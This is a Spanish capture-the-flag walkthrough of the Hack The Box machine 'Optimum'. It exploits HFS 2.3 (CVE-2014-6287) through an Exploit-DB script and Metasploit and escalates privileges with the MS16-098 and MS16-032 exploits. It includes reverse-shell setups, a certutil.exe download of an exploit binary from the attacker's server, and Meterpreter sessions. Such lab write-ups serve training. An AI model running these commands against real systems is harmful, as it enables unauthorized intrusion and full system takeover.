---
title: "Optimum - Hack The Box"
date: 2023-02-16
draft: false
slug: "htb-writeup-optimum"
excerpt: "La máquina Optimum, bastante sencilla con varias formas para poder vulnerarla, en mi caso use el CVE-2014-6287 para poder acceder a la máquina como usuario, y para escalar privilegios utilice el Exploit MS16-032 y MS16-098."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "Http File Server (HFS)", "Remote Command Execution (RCE)", "CVE-2014-6287 (RCE)", "System Recognition (Windows)", "Local Privilege Escalation (LPE)", "Privesc - MS16-098 (LPE)", "Privesc - MS16-032 (LPE)", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "whatweb"
  - "searchsploit"
  - "locate"
  - "nc"
  - "python2"
  - "certutil.exe"
  - "python3"
  - "git"
  - "pip2"
  - "windows-exploit-suggester.py"
  - "metasploit framework(msfconsole)"
  - "Módulo: windows/http/rejetto_hfs_exec"
  - "Módulo: post/multi/recon/local_exploit_suggester"
  - "Módulo: exploit/windows/local/ms16_032_secondary_logon_handle_privesc"
links:
  - "https://www.exploit-db.com/exploits/39161"
  - "https://github.com/FuzzySecurity/PowerShell-Suite"
  - "https://github.com/sensepost/ms16-098"
  - "https://rednode.com/privilege-escalation/windows-privilege-escalation-cheat-sheet/"
  - "https://github.com/AonCyberLabs/Windows-Exploit-Suggester"
  - "https://www.aon.com/cyber-solutions/aon_cyber_labs/introducing-windows-exploit-suggester/"
  - "https://www.reddit.com/r/learnpython/comments/ft0h3p/windowsexploitsuggester_error/"
  - "https://tecnonucleous.com/2018/04/05/certutil-exe-podria-permitir-que-los-atacantes-descarguen-malware-mientras-pasan-por-alto-el-antivirus/"
  - "https://www.exploit-db.com/exploits/39719"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-optimum/optimum_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Realicemos un ping para saber si la máquina está conectada y analizaremos el TTL para saber que SO opera en dicha máquina.
```bash
ping -c 4 10.10.10.8       
PING 10.10.10.8 (10.10.10.8) 56(84) bytes of data.
64 bytes from 10.10.10.8: icmp_seq=1 ttl=127 time=137 ms
64 bytes from 10.10.10.8: icmp_seq=2 ttl=127 time=136 ms
64 bytes from 10.10.10.8: icmp_seq=3 ttl=127 time=137 ms
64 bytes from 10.10.10.8: icmp_seq=4 ttl=127 time=138 ms

--- 10.10.10.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 136.461/137.143/137.939/0.526 ms
```
Gracias al TTL sabemos que la máquina usa Windows. Realicemos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.8 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 13:28 CST
Initiating SYN Stealth Scan at 13:28
Scanning 10.10.10.8 [65535 ports]
Discovered open port 80/tcp on 10.10.10.8
Completed SYN Stealth Scan at 13:28, 26.96s elapsed (65535 total ports)
Nmap scan report for 10.10.10.8
Host is up, received user-set (0.32s latency).
Scanned at 2023-02-16 13:28:24 CST for 27s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.03 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 23 (1.012KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Al parecer, solamente hay un puerto abierto y es del **servicio HTTP**. Ahora, veamos a que nos enfrentamos con un escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p80 10.10.10.8 -oN targeted                                            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 13:31 CST
Nmap scan report for 10.10.10.8
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3

|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Esta usando el servicio HFS, vamos a investigarlo y de paso, analicemos la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Primero, investiguemos el servicio:

| **HTTP File Server** |
|:-----------:|
| *También conocido como HFS, es un servidor web gratuito diseñado específicamente para publicar y compartir archivos. Puedes utilizar HFS para enviar y recibir archivos, pues permite acceder a los archivos de su teléfono desde una computadora de escritorio, tableta u otros dispositivos sin ningún software especial, solo un navegador web. Se diferencia del intercambio de archivos clásico porque utiliza tecnología web para ser más compatible con la Internet actual.* |

Muy bien, usemos **whatweb** para ver que nos dice:
```bash
whatweb http://10.10.10.8/                                                                                              
http://10.10.10.8/ [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.10.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
```
No nos da mucha información que nos sea util.

Vamos a entrar a ver que show:

![](/assets/images/htb-writeup-optimum/Captura1.png)

Nos muestra varias herramientas que se pueden utilizar, si nos vamos al login nos pedirá credenciales que obviamente no tenemos:

<p align="center">
<img src="/assets/images/htb-writeup-optimum/Captura2.png">
</p>

Ahí mismo nos aparece la información del servidor que ya nos dio el escaneo de servicios y la **herramienta whatweb**:

<p align="center">
<img src="/assets/images/htb-writeup-optimum/Captura3.png">
</p>

Afortunadamente, ya tenemos la versión que se esta ocupando y es la versión **HFS 2.3**. Es momento de buscar un Exploit.

## Explotación de Vulnerabilidades {#Explotacion}

### Buscando un Exploit {#Exploit}

```bash
searchsploit HFS 2.3                 
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path

|---|---|
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                     | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                             | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                        | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                        | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                   | windows/webapps/34852.txt

|---|---|
Shellcodes: No Results
Papers: No Results
```
Hay varios que podemos probar y que justo son RCE, empecemos con el Exploit en **Python** primero.

#### Probando Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) {#PruebaExp}

Si revisamos el Exploit, observa que nos dice algo importante:

| *Traducción* |
|:-----------:|
| *Debe estar utilizando un servidor web que aloje netcat (http://attackers_ip:80/nc.exe) y ¡Es posible que deba ejecutarlo varias veces para tener éxito!* |

Entonces, debemos alzar un servidor web que contenga una **netcat**, como con otras máquinas, para que este Exploit descargue dicha **netcat** en el **servicio HFS**, y supongo que si lo ejecutamos otra o varias veces, hara que se ejecute la **netcat** y nos conecte. Vamos a copiar el Exploit y lo modificaremos:
```bash
searchsploit -m windows/remote/39161.py
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (540)
```

Ahora sí, hagámoslo por pasos:

* Para empezar, busquemos la **netcat** en Kali:
```bash
locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
```

* Copiamos la de binarios:
```bash
cp /usr/share/windows-resources/binaries/nc.exe .
ls           
allPorts  HFS_Exploit.py  nc.exe  targeted
```

* Antes de levantar el servidor para cargar la netcat, hay que cambiar estas dos variables del Exploit:
```python
	ip_addr = "Tu_IP" #local IP address
        local_port = "443" # Local Port number
```

* Ahora sí, activamos el servidor:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* Activamos una netcat con el puerto que pusimos:
```bash
nc -nvlp 443                       
listening on [any] 443 ...
```

* Y lanzamos el Exploit, como bien menciona hay que activarlo varias veces, en mi caso funciono a la segunda:
```bash
python2 HFS_Exploit.py 10.10.10.8 80
```

* Listo, ya estamos dentro:
```bash
nc -nvlp 443                       
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.8] 49162
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas
```

* Justamente entramos como un usuario y en su escritorio, entonces ahí mismo está la flag del usuario:
```batch
C:\Users\kostas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D
 Directory of C:\Users\kostas\Desktop
06/04/2023  07:25 ��    <DIR>          .
06/04/2023  07:25 ��    <DIR>          ..
18/03/2017  03:11 ��           760.320 hfs.exe
06/04/2023  07:24 ��                34 user.txt
               2 File(s)        760.354 bytes
               2 Dir(s)   5.673.574.400 bytes free
C:\Users\kostas\Desktop>type user.txt
type user.txt
...
```
Excelente, ahora vamos a probar la versión con **Metasploit Framework**.

#### Probando Exploit: Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit) {#PruebaExp2}

Vamos a iniciar la herramientas **Metasploit Framework**, buscaremos los Exploits para el **servicio HFS 2.3** y usaremos el Exploit que quede para esta máquina.

Hagamoslo por pasos:

* Iniciando **Metasploit**:

```bash
msfconsole
 ______________________________________
/ it looks like you're trying to run a \                                                                                                                                                                                                   
\ module                               /                                                                                                                                                                                                   
 --------------------------------------                                                                                                                                                                                                    
 \                                                                                                                                                                                                                                         
  \                                                                                                                                                                                                                                        
     __                                                                                                                                                                                                                                    
    /  \                                                                                                                                                                                                                                   

    |  |                                                                                                                                                                                                                                   
    @  @                                                                                                                                                                                                                                   

    |  |                                                                                                                                                                                                                                   
    || |/                                                                                                                                                                                                                                  
    || ||                                                                                                                                                                                                                                  
    |\_/|                                                                                                                                                                                                                                  
    \___/                                                                                                                                                                                                                                  
*
       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]
.
Metasploit tip: Save the current environment with the 
save command, future console restarts will use this 
environment again
Metasploit Documentation: https://docs.metasploit.com/
```

* Buscando y usando un Exploit:

```bash
msf6 > search hfs 2.3
*
Matching Modules
================
   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
*
Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/rejetto_hfs_exec
*
msf6 > use exploit/windows/http/rejetto_hfs_exec
*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) >
```

* Configurando Exploit:
```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
RHOSTS => 10.10.10.8
msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST Tu_IP
LHOST => Tu_IP
```

* Iniciando Exploit:
```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
.
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Using URL: http://Tu_IP:8080/SUxJCT
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /SUxJCT
[*] Sending stage (175686 bytes) to 10.10.10.8
[!] Tried to delete %TEMP%\xiIhUkZlpFlSwI.vbs, unknown result
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 10.10.10.8:49162)
[*] Server stopped.
.
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > shell
Process 460 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
.
C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas
```

Esta fue una forma muy sencilla para ganar acceso a la máquina.

## Post Explotación {#Post}

### Enumeración de Máquina {#PostEnum}

Veamos que permisos tenemos y quizá con eso podamos convertirnos en Root o en este caso como **NT Authority System**.
```batch
C:\Users\kostas\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

No estoy del todo seguro de que podamos aprovecharnos de ese privilegio, así que mejor veamos que version de Windows corre la máquina:
```batch
C:\Users\kostas\Desktop>systeminfo 
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
```
La máquina usa **Windows 2012 6.3.9600 N/A Build 9600**, busquemos un Exploit para este. Pero mejor usemos una herramienta muy útil para estos casos.

La herramienta **Windows Exploit Suggester** nos va a ayudar a encontrar los Exploits a los que es vulnerable la máquina, únicamente debemos pasarle un fichero que almacene toda la información que nos dé el comando **systeminfo** de la máquina víctima, primero vamos a descargar esta herramienta:

* Clona el repo: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank">Repositorio de AonCyberLabs: Windows Exploit Suggester</a>
```bash
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
Clonando en 'Windows-Exploit-Suggester'...
remote: Enumerating objects: 120, done.
remote: Counting objects: 100% (67/67), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 120 (delta 58), reused 54 (delta 54), pack-reused 53
Recibiendo objetos: 100% (120/120), 156.83 KiB | 1.15 MiB/s, listo.
Resolviendo deltas: 100% (74/74), listo.
```

Una vez descargada, solamente seguimos las instrucciones del GitHub o si no te funciona, hazle como yo:
```bash
python2 windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2023-03-30-mssb.xls
[*] done
```
Al hacer esto, nos da un archivo que necesitaremos usar junto al archivo donde está la información del sistema, de hecho, ahí te dice que se creó un archivo: **writing to file 2023-03-30-mssb.xls**

Vamos a copiar toda la información que nos dio el comando **systeminfo** y la guardaremos en un fichero con el mismo nombre o uno similar:
```bash
nano sysinfo.txt
ls                                           
2023-03-30-mssb.xls  LICENSE.md  README.md  sysinfo.txt  windows-exploit-suggester.py
```
Corremos el **suggester** y nos saldran varios Exploits para esta máquina. 

IMPORTANTE, a la primera no me sirvió, por lo que tuve que instalar otra cosa:
```bash
pip2 install xlrd==1.2.0
```
Aquí viene ese problema:
* <a href="https://www.reddit.com/r/learnpython/comments/ft0h3p/windowsexploitsuggester_error/" target="_blank">Windows-Exploit-Suggester Error</a>

Ahora sí, usemos el **suggester**:
```shell
python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
...
```
Puedes intentar probar con varios, yo en especial voy a probar con el **MS16-098** porque intente probar el **MS16-032** pero no me funciono, luego veremos si se puede usar en el **Metasploit Framework**.

### Probando Exploit: Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow (MS16-098) {#PruebaExp3}

Busquemos el Exploit:
```bash
searchsploit MS16-098                  
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path

|---|---|
Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow (MS16-098)                                         | windows_x86-64/local/41020.c
Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098) (2)                                       | windows_x86-64/local/42435.txt

|---|---|
Shellcodes: No Results
Papers: No Results
```
El Exploit esta hecho en **C**. Si analizamos el contenido del Exploit, arriba vienen adjuntos dos links, uno con información sobre este Exploit y otro con el que podremos descargar un ejecutable de dicho Exploit, descárgalo.

Después de descárgarlo, vamos a meterlo a la máquina, para esto usaremos **certutil.exe** como en otras máquinas con **Windows**.

Muy bien, hagámoslo por pasos:

* Levantamos un servidor con **Python** en donde este el Exploit ejecutable:
```bash
python3 -m http.server                                                            
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* Nos metemos a la **directorio /Temp** y creamos un directorio nuevo, lo llamaremos **privesc**:
```batch
C:\Users\kostas\Desktop>cd C:\Windows/Temp
mkdir Privesc
cd Privesc
```

* Y dentro de la máquina usamos la **herramienta certutil.exe**:
```batch
C:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://10.10.14.12:8000/Exploit.exe Exploit.exe
certutil.exe -urlcache -split -f http://10.10.14.12:8000/Exploit.exe Exploit.exe
****  Online  ****
  000000  ...
  088c00
CertUtil: -URLCache command completed successfully.
```

* Verificamos si está el Exploit:
```batch
C:\Windows\Temp\Privesc>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D
 Directory of C:\Windows\Temp\Privesc
06/04/2023  04:44 ��    <DIR>          .
06/04/2023  04:44 ��    <DIR>          ..
06/04/2023  04:44 ��           560.128 Exploit.exe
               1 File(s)        560.128 bytes
               2 Dir(s)   5.652.480.000 bytes free
```

* Y lo activamos:
```batch
C:\Windows\Temp\Privesc>Exploit.exe
Exploit.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\Windows\Temp\Privesc>whoami
whoami
nt authority\system
```

¡LISTO!, ya entramos, solamente busca la flag en el directorio Administrator. Ahora, veamos como sería aplicar la enumeración de la máquina y la escalada de privilegios en **Metasploit**.

### Enumeración de Máquina con Metasploit Framework {#PostEnum2}

Como ya tenemos una sesión activa, vamos a utilizar el **módulo Suggester**, para que busque que Exploits pueden ser utilizados en la máquina con el fin de escalar privilegios.

Vamos por pasos:

* Buscando y usando **módulo Suggester**:

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > search suggester
*
Matching Modules
================
   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
*
Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
*
msf6 exploit(windows/http/rejetto_hfs_exec) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) >
```

* Configurando **módulo Suggester**:
```bash
msf6 post(multi/recon/local_exploit_suggester) > sessions
*
Active sessions
===============
  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  Tu_IP:4444 -> 10.10.10.8:49162 (10.10.10.8)
*
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
```

* Ejecutando módulo:

```bash
msf6 post(multi/recon/local_exploit_suggester) > exploit
.
[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 181 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.8 - Valid modules for session 1:
============================
 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
```

Excelente, nos marca 2 Exploits, aunque nos vamos a ir por el **MS16-032** para poder escalar privilegios, pues este también lo marco el **Windows Exploit Suggester**.

### Probando Exploit: Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell) {#PruebaExp4}

Vamos a configurar el **Exploit MS16-032**, vamos por pasos:

* Usando Exploit:
```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >
```

* Configurando Exploit:
```bash
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST Tu_IP
LHOST => Tu_IP
```

* Iniciando Exploit:

```bash
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit
.
[*] Started reverse TCP handler on Tu_IP:4444 
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\uFuAbbcLlZcEA.ps1...
[*] Compressing script contents...
[+] Compressed size: 3747
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 

        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1336
.
[*] Sniffing out privileged impersonation token..
.
[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $f_tJ = [Ntdll]::NtImpersonateThread($brGHO, $brGHO, [ref]$ko)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (ko:VariablePath) [], RuntimeException
    + FullyQualifiedErrorId : NonExistingVariableReference
. 
[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!
.
[*] Sniffing out SYSTEM shell..
.
[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateToken" to type "System.IntPtr": "Cannot co
nvert null to type "System.IntPtr"."
At line:259 char:2
+     $f_tJ = [Advapi32]::DuplicateToken($kZYdB, 2, [ref]$rG8)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
. 
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!
.
4EDKxA5vE7QaBz8XYpkCzVQhmf78eB0p
[+] Executed on target machine.
[*] Sending stage (175686 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (Tu_IP:4444 -> 10.10.10.8:49163)
[+] Deleted C:\Users\kostas\AppData\Local\Temp\uFuAbbcLlZcEA.ps1
.
meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > shell
Process 1852 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
.
C:\Windows\system32>whoami
whoami
nt authority\system
```

Y listo, con esto hemos completado esta máquina.
